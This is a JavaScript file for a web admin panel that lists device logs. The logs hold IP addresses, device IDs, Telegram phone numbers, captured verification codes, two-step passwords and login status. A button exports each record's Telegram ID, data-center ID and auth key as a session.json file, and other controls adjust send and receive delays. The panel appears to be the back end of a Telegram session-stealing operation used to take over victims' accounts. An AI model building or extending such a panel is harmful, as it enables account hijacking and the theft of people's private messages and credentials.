var uTable;
var search_txt='';
var search_txt_install_date = null;
var search_txt_ip=null;
var search_txt_deviceid=null;
var search_txt_phone=null;
var search_txt_note=null;
var is_global_search = false;
var fcode = [];
var _token = $("#csrf_token").val();
$(function(){
	// .toISOString().split('T')[0]
	var date = new Date();
	const format = '{y}-{m}-{d}'

	const formatObj = {
		y: date.getFullYear(),
		m: date.getMonth() + 1,
		d: date.getDate(),
		h: date.getHours(),
		i: date.getMinutes(),
		s: date.getSeconds(),
		a: date.getDay()
	  }
	const time_str = format.replace(/{([ymdhisa])+}/g, (result, key) => {
	const value = formatObj[key]
	// Note: getDay() returns 0 on Sunday
	if (key === 'a') { return ['日', '一', '二', '三', '四', '五', '六'][value ] }
	return value.toString().padStart(2, '0')
	})
	$(".install-date").val(time_str);
	console.log("date", $(".install-date").val())

    uTable = $('#users-table').dataTable({
        "processing": true,
        "serverSide": true,
        "responsive": true,
        "language":{
        	"sSearch":"",
        	"sSearchPlaceholder":"Search...",
        	"paginate":{
        		"previous":"<",
        		"next":">"
        	}
        },
        "lengthMenu": [[10, 25, 50, 100], [10, 25, 50, 100]],
		// "iDisplayLength": 10,
        "ajax": {
            "url": "getLogs",
            "type": "GET",
            "data":function(key){
				if(is_global_search) search_txt_install_date = '';
				else search_txt_install_date = $(".install-date").val();
				search_txt_note = $(".tg-note").val();
				// search_txt_ip = $(".ip-address").val();
				// search_txt_deviceid=$(".device-id").val();
				search_txt_phone=$(".tg-phone").val();
				key.search_txt_install_date = search_txt_install_date;
                // key.search_txt_ip=search_txt_ip;
				// key.search_txt_deviceid=search_txt_deviceid;
				key.search_txt_phone=search_txt_phone;
				key.search_txt_note=search_txt_note;
				key.mark = '';
				// key.search_txt=search_txt;
				// console.log("key", key);
                // key._token=$('#token_id').val();

				$('.btn-select-all').html("全选");

            }
        }, 
        // "dom": '<"toolbar">rtip',
		// 'dom': '<"row"<"col-lg-6"l><"col-lg-6"f>><"table-responsive"t>p',
        "columnDefs": [
            {
                "targets": "_all",
                "searchable": true
            },
            { 
            	"orderable": false,
                "targets": []
            },
         ],
		 "bFilter": true,
         "columns":[
			{
				'data':'ID',
				"render":function (data,type,row,meta) {
				   var el="<input type='checkbox' name='mycheckboxes' value='"+row.ID+"'/>"
				   return el;
				}
			},
         	{
         		'data':'ID',
         		"render":function (data,type,row,meta) {
	                var page=uTable.api().page();
	                return "<span style='color:black;font-weight: bold;'>"+(page*meta.settings._iDisplayLength+meta.row+1)+"</span>"+"<span style='display:none' class='client-id'>"+data+"</span>";
	            }
         	},
			// {
			// 	'data': 'IS_PC',
			// 	"render":function (data,type,row,meta) {
	        //         var el="<span>手机</span>";
			// 		if(data == 1) el="<span>电脑</span>";
	        //         return el;
	        //     }
			// },
			{
				'data':'INSTALL_DATE'
			},
         	{
         		'data':'INSTALL_COUNTRY_CN'
         	},
			// {
			// 	'data':'INSTALL_COUNTRY'
			// },
			{
				'data':'IP_ADDRESS'
			},
			{
				'data':'DEVICEID'
			},
			{
				'data':'TG_NUMBER'
			},
			{
				'data':'LOGIN_STATUS',
				"render":function (data,type,row,meta) {
	                var el="<span>已登陆</span>";
					if(data != 1) el="<span>未登陆</span>";
	                return el;
	            }
			},
			{
				'data':'VERIFYCODE',
			},
			{
				'data':'TWOSTEP',
			},
			{
				'data':'SESSION',
				"render":function (data,type,row,meta) {
					var el="<a href='#dialog' class='btn btn-primary btn-xs sessionDownloadBtn' onclick='clickDownloadJson(\""+row.TG_ID+"\", \""+row.DATACENTERID+"\", \""+row.AUTO_KEY+"\")'><i class='fa fa-download'></i> 下载</a>";
					if(row.TG_ID == "" || row.TG_ID == null)  {
						el="<a href='#dialog' class='btn btn-danger btn-xs sessionDownloadBtn'><i class='fa fa-download'></i> 下载</a>";
					}
	                return el;
	            }
			},
			// {
			// 	'data':'TO_DEVICEID',
			// 	"render":function (data,type,row,meta) {
	        //         var el="<a href='#dialog' class='btn btn-primary btn-xs' onclick='clickDownload(" + row.ID + "," +(meta.row) + ")'><i class='fa fa-download'></i> Download</a>&nbsp;&nbsp;To - " + data;
	        //         return el;
	        //     }
			// },
			{
				'data':'DELAY',
				"render":function (data,type,row,meta) {
					var el="<a href='#dialog' class='btn btn-primary btn-xs' onclick='clickSetSend(" + row.ID + "," +(meta.row) + ")'>发送</a>&nbsp;&nbsp;"+row.SEND_DELAY+"&nbsp;&nbsp;"+
					"<a href='#dialog' class='btn btn-primary btn-xs' onclick='clickSetRecv(" + row.ID + "," +(meta.row) + ")'>收到</a>&nbsp;&nbsp;"+row.RECEIVE_DELAY; 
				   return el;
			   }
			},
			{
				'data': 'NOTE',
				// "render":function (data,type,row,meta) {
	            //     return "<span class='client-id-note'>"+data+"</span>";
	            // }

			},			
			{
				'data':'edit',
				"render":function (data,type,row,meta) {
					var page=uTable.api().page();
					var el="<a href='#dialog' class='btn btn-primary btn-xs' onclick='clickSetNote(" + row.ID + "," +(meta.row) + ")'>编辑</a>";

				   return el;
			   }
			},  
         	{
         		'data':'updated_at',
         		"render":function (data,type,row,meta) {
	                var el="<a href='#dialog' class='btn btn-danger btn-xs deleteBtn' id='"+row.ID+"' onclick='clickDelete(" + row.ID + "," +(meta.row) + ")'>删除</a>";
	                return el;
	            }
         	}
         ],
		 fnRowCallback: function(nRow, aData, iDisplayIndex){
			if(aData.MARK == 1) {
				// console.log("mark", aData);
				// console.log("row", nRow);
				$("td:first", nRow).css("background","red");
			}
            
            return nRow;
         },
         "footerCallback": function (){
         	// $('#users-table_filter').html("<input type='search' class='form-control users-search' placeholder='Search' aria-controls='users-table' onkeyup='whichButton(event)'>");
			 $('#users-table_filter').html("");
    		// $('#users-table_filter').html("<div style='display:flex'>"+
			// 	"<input type='search' class='form-control users-search' placeholder='IP Address' aria-controls='users-table' onkeyup='whichButton(event)'/>" +
			// 	"<input type='search' class='form-control users-search-deviceid' placeholder='Device ID' aria-controls='users-table' onkeyup='whichButton(event)'/>" +
			// 	"<input type='search' class='form-control users-search-phone' placeholder='Phone' aria-controls='users-table' onkeyup='whichButton(event)'/>" +
			// 	"</div>"
			// 	);
         	$("#users-table_filter input").off('keyup');
         	$("#users-table_filter input").off('cut');
         	$("#users-table_filter input").off('keypress');
         	$("#users-table_filter input").off('cut');
         	$("#users-table_filter input").off('search');
         	$("#users-table_filter input").off('input');
         	$("#users-table_filter input").off('paste');
         	setTimeout(defineFunction,500);
         }         
    });

	$(".btn-search").click(function(){
		is_global_search = false;
    	uTable.fnFilter();
	});
	
	$(".btn-global-search").click(function(){
		is_global_search = true;
    	uTable.fnFilter();
	});

	$(".install-date").on('change', function(){
		console.log("filter date");
		is_global_search = false;
    	uTable.fnFilter();
	});



	$(".btn-select-all").click(function(){
		if($('.btn-select-all').text() == '全选') {
			$('.btn-select-all').html("取消全选");
			// $("input[type='checkbox']").prop("checked", true);
			for (const checkbox of document.querySelectorAll('input[name=mycheckboxes]')) {
				checkbox.checked = true //for selection
			}			
		} else {
			$('.btn-select-all').html("全选");
			// $("input[type='checkbox']").prop("checked", false);
			for (const checkbox of document.querySelectorAll('input[name=mycheckboxes]')) {
				checkbox.checked = false //for selection
			}			
		} 
	});

	$(".btn-delete-sel").click(function(){
		const data = [...document.querySelectorAll('input[name=mycheckboxes]:checked')].map(e => e.value);
		console.log("checkboxed", data);
		if(data !== null && data.length >0) {
			$.ajax({
				url: "deleteLogsSelections",
				type:'get',
				data: {
					checkboxes: data,
					log_delete:1
				},
				success: function(result){
					// uTable.api().ajax.reload();
					for(var i=0;i<data.length;i++) {
						$("#"+data[i]).closest('tr').remove();
					}

				}
			});
		}
	});
});

function clickDownloadJson(TG_ID, DATACENTERID, AUTO_KEY) {
	//console.log(`TG_ID`, TG_ID);
	//console.log(`DATACENTERID`, DATACENTERID);
	//console.log(`AUTO_KEY`, AUTO_KEY);
	var exportObj = {};
	exportObj.tgid = TG_ID;
	exportObj.datacenterid = DATACENTERID;
	exportObj.auto_key = AUTO_KEY;
	
	var dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(exportObj));
	var downloadAnchorNode = document.createElement('a');
	downloadAnchorNode.setAttribute("href",     dataStr);
	downloadAnchorNode.setAttribute("download", "session.json");
	document.body.appendChild(downloadAnchorNode); // required for firefox
	downloadAnchorNode.click();
	downloadAnchorNode.remove();
}

function clickDownload( id, rowindex) {
	let toDeviceId = prompt("Please enter destinstaion device id", "");
  	if ((toDeviceId != null) && (toDeviceId != "")) {
		// console.log(`clickID`, id);
		// console.log(`toDeviceId`, toDeviceId);

		$.ajax({
            url: "editLog",
            type:'get',
            data:{
            	ID:id,
            	TO_DEVICEID:toDeviceId
            },
            success: function(result){
				var table = $('#users-table').DataTable();
				var temp = table.row(rowindex).data();
				temp['TO_DEVICEID'] = toDeviceId;
				table.row(rowindex).data(temp).invalidate();
				// uTable.api().ajax.reload();
			}
        });
  	}
}

function clickSetSend( id, rowindex) {
	let sendDelay = prompt("Please enter send delay in ms", "");
  	if ((sendDelay != null) && (sendDelay != "")) {

		$.ajax({
            url: "editLog",
            type:'get',
            data:{
            	ID:id,
            	SEND_DELAY:sendDelay
            },
            success: function(result){
				var table = $('#users-table').DataTable();
				var temp = table.row(rowindex).data();
				temp['SEND_DELAY'] = sendDelay;
				table.row(rowindex).data(temp).invalidate();

				// uTable.api().ajax.reload();
			}
        });
  	}
}

function clickSetRecv( id, rowindex) {
	let recvDelay = prompt("Please enter receive delay in ms", "");

  	if ((recvDelay != null) && (recvDelay != "")) {

		$.ajax({
            url: "editLog",
            type:'get',
            data:{
            	ID:id,
            	RECEIVE_DELAY:recvDelay
            },
            success: function(result){
				var table = $('#users-table').DataTable();
				var temp = table.row(rowindex).data();
				temp['RECEIVE_DELAY'] = recvDelay;
				table.row(rowindex).data(temp).invalidate();

				// uTable.api().ajax.reload();
			}
        });
  	}
}

function clickSetNote(id, rowindex) {
	let note = prompt("Please enter note", "");
	if (note != null && note != "") {
	// console.log(`clickID`, id);
	// console.log(`recvDelay`, recvDelay);

		$.ajax({
			url: "editLog",
			type:'get',
			data:{
				ID:id,
				NOTE:note
			},
			success: function(result){

				var table = $('#users-table').DataTable();
				var temp = table.row(rowindex).data();
				temp['NOTE'] = note;
				table.row(rowindex).data(temp).invalidate();
				
				// uTable.api().ajax.reload();
			}
		});
	}
}

function clickDelete(id, rowindex) {
	if(confirm("Do you want to delete current log?")){
		$.ajax({
			url: "deleteLog",
			type:'get',
			data:{
				id:id,
				log_delete:1
			},
			success: function(result){
				// uTable.api().ajax.reload();

				// var table = $('#users-table').DataTable();
				// table.row(rowindex).remove().draw();

				$("#"+id).closest('tr').remove();
			}
		});
	}
}

function defineFunction(){
	// $(".editBtn").click(function(){
	// 	let note = prompt("Please enter note", "");
	// 	if (note != null) {
	// 	// console.log(`clickID`, id);
	// 	// console.log(`recvDelay`, recvDelay);
	// 		var id = $(this).parents("tr").find("td").find(".client-id").text();
	// 		$.ajax({
	// 			url: "editLog",
	// 			type:'get',
	// 			data:{
	// 				ID:id,
	// 				NOTE:note
	// 			},
	// 			success: function(result){
	// 				uTable.api().ajax.reload();
	// 			}
	// 		});
	// 	}
	// });

	// $(".deleteBtn").click(function(){
	// 	if(confirm("Do you want to delete current log?")){
	// 		var id = $(this).parents("tr").find("td").find(".client-id").text();
	// 		$.ajax({
	//             url: "deleteLog",
	//             type:'get',
	//             data:{
	//             	id:id,
	//             },
	//             success: function(result){
	//             	uTable.api().ajax.reload();
	//             }
	//         });
	// 	}
	// });	

	$("#users-table_filter").keyup(function(event){
		if(event.keyCode===13){
	        search_txt=$("#users-table_filter input").val();
			console.log("search_txt", search_txt)
    		uTable.fnFilter();
		}
	});
}

function whichButton(event) {
    if (event.keyCode == 13) {
        search_txt_ip=$(".users-search").val();
		search_txt_deviceid=$(".users-search-deviceid").val();
		search_txt_phone=$(".users-search-phone").val();
    	uTable.fnFilter();
    }
}

